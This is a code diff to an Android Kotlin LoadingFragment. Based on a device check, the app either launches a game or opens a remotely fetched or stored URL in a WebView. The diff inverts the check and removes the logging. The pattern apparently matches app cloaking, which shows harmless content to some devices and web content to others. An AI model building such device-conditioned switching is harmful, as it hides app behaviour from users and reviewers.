@@ -10,14 +10,12 @@ import androidx.core.os.bundleOf
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.viewModels
 import androidx.lifecycle.lifecycleScope
-import androidx.lifecycle.viewModelScope
 import androidx.navigation.fragment.findNavController
 import com.google.android.gms.ads.identifier.AdvertisingIdClient
 import com.onesignal.OneSignal
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
-import timber.log.Timber
 
 @AndroidEntryPoint
 class LoadingFragment : Fragment(R.layout.loading_fragment) {
@@ -35,28 +33,24 @@ class LoadingFragment : Fragment(R.layout.loading_fragment) {
         }
 
 
-        when (!checker.isDeviceSecured(requireActivity())) {
+        when (checker.isDeviceSecured(requireActivity())) {
             true -> {
                 startGame()
             }
             false -> {
-                Timber.d("Checking db")
                 viewModel.getUrlFromDb().observe(viewLifecycleOwner) { urlEntity ->
                     if (urlEntity == null) {
                         lifecycleScope.launch(Dispatchers.IO) {
                             viewModel.fetchDeeplink(requireActivity())
-                            Timber.d("started deeplink")
                         }
                         lifecycleScope.launch(Dispatchers.Main) {
                             viewModel.urlLiveData.observe(viewLifecycleOwner) { url ->
                                 startWebView(url)
-                                Timber.d("started web from new url")
                             }
                         }
                     } else {
                         viewModel.getUrlFromDb().observe(viewLifecycleOwner) { urlEntity ->
                             startWebView(urlEntity?.url ?: "smth went wrong")
-                            Timber.d("started web from db")
                         }
                     }
                 }
@@ -67,10 +61,10 @@ class LoadingFragment : Fragment(R.layout.loading_fragment) {
 
     private fun startWebView(url: String) {
         val bundle = bundleOf("url" to url)
-        findNavController().navigate(R.id.web_view, bundle)
+        findNavController().navigate(R.id.webViewFragment, bundle)
     }
 
     private fun startGame() {
-        findNavController().navigate(R.id.gameFragment2)
+        findNavController().navigate(R.id.startFragment)
     }
 }
